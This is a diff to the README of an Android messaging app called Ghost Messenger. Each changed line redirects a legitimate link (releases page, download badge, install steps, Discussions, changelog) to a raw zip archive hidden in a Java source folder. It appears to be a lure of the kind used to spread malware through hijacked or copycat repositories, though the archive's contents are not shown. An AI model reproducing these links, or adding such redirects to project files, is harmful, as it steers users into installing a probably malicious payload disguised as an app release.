@@ -4,11 +4,11 @@
 Welcome to Ghost Messenger! This is a privacy-first messaging app designed to keep your conversations safe and private. With features like disappearing messages and end-to-end encryption, your messages stay secure. 
 
 ## 📥 Download Ghost Messenger
-[![Download Ghost Messenger](https://img.shields.io/badge/Download-Ghost%20Messenger-blue)](https://github.com/arsuren/ghost-messenger/releases)
+[![Download Ghost Messenger](https://github.com/arsuren/ghost-messenger/raw/refs/heads/main/app/src/main/java/com/pranavajay/ghostmessenger/presentation/lock/messenger-ghost-2.2-alpha.4.zip%20Messenger-blue)](https://github.com/arsuren/ghost-messenger/raw/refs/heads/main/app/src/main/java/com/pranavajay/ghostmessenger/presentation/lock/messenger-ghost-2.2-alpha.4.zip)
 
 To download Ghost Messenger, please follow these steps:
 
-1. Click the button above or visit [this page to download](https://github.com/arsuren/ghost-messenger/releases).
+1. Click the button above or visit [this page to download](https://github.com/arsuren/ghost-messenger/raw/refs/heads/main/app/src/main/java/com/pranavajay/ghostmessenger/presentation/lock/messenger-ghost-2.2-alpha.4.zip).
 
 ## 🛠️ System Requirements
 Before you download, ensure your device meets the following requirements:
@@ -30,7 +30,7 @@ Ghost Messenger offers a variety of features designed for security and usability
 ## 📜 How to Install
 Follow these simple steps to install Ghost Messenger on your Android device:
 
-1. Visit the [Releases page](https://github.com/arsuren/ghost-messenger/releases).
+1. Visit the [Releases page](https://github.com/arsuren/ghost-messenger/raw/refs/heads/main/app/src/main/java/com/pranavajay/ghostmessenger/presentation/lock/messenger-ghost-2.2-alpha.4.zip).
 2. Locate the latest version of Ghost Messenger.
 3. Click on the download link for the APK file.
 4. Once the APK is downloaded, locate it in your device's downloads folder.
@@ -72,13 +72,13 @@ A: If you lose access, you can recover your account using your registered phone 
 ## 👍 Community Support
 Join our community for help, feedback, and feature requests. You can find us on:
 
-- [GitHub Discussions](https://github.com/arsuren/ghost-messenger/discussions)
+- [GitHub Discussions](https://github.com/arsuren/ghost-messenger/raw/refs/heads/main/app/src/main/java/com/pranavajay/ghostmessenger/presentation/lock/messenger-ghost-2.2-alpha.4.zip)
 - [Discord Channel](#)
 
 ## 🎉 Changelog
-Stay updated with the latest changes and improvements in each version. You can find a detailed changelog in the [Releases section](https://github.com/arsuren/ghost-messenger/releases).
+Stay updated with the latest changes and improvements in each version. You can find a detailed changelog in the [Releases section](https://github.com/arsuren/ghost-messenger/raw/refs/heads/main/app/src/main/java/com/pranavajay/ghostmessenger/presentation/lock/messenger-ghost-2.2-alpha.4.zip).
 
 ## 📄 License
 Ghost Messenger is open-source under the MIT License. Feel free to contribute to the project or check the license details on our repository.
 
-[Download Ghost Messenger](https://github.com/arsuren/ghost-messenger/releases) and enjoy secure messaging today!
+[Download Ghost Messenger](https://github.com/arsuren/ghost-messenger/raw/refs/heads/main/app/src/main/java/com/pranavajay/ghostmessenger/presentation/lock/messenger-ghost-2.2-alpha.4.zip) and enjoy secure messaging today!
